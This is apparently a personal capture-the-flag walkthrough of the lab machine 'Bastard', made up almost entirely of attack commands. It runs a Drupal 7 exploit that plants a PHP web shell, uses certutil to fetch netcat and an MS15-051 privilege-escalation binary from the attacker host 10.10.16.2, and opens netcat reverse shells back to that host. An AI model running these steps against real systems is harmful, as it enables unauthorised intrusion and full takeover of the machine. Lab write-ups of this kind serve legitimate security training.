----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# Bastard
# 14/4/2023
10.10.10.9

----------------------------------------------------
# nmap
----------------------------------------------------
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC

----------------------------------------------------
# exploitaion
---------------------------------------------------
port 80 runnning drupal 7
└─$ searchsploit -m php/webapps/41564.php
apt install php-curl

I’ll update the script:

$url = 'http://10.10.10.9';
$endpoint_path = '/rest';
$endpoint = 'rest_endpoint';

$file = [
    'filename' => 'shub.php',
    'data' => '<?php system($_REQUEST["cmd"]); ?>'
];
=>php 41564.php
curl http://10.10.10.9/shub.php?cmd=whoami
curl http://10.10.10.9/shub.php?cmd=certutil -urlcache -split -f http://10.10.16.2/nc64.exe
curl http://10.10.10.9/shub.php?cmd=nc64.exe -e cmd 10.10.16.2 1234
got shell
---------------------------------------------------
# priv esc
---------------------------------------------------
10.10.10.9/shub.php?cmd=certutil -urlcache -split -f http://10.10.16.2/ms15-051x64.exe
ms15-051x64.exe whoami
└─$ rlwrap nc -lvnp 8081 
ms15-051x64.exe "whoami"
└─$ rlwrap nc -lvnp 8081 
ms15-051x64.exe "nc64.exe -e cmd 10.10.16.2 8081"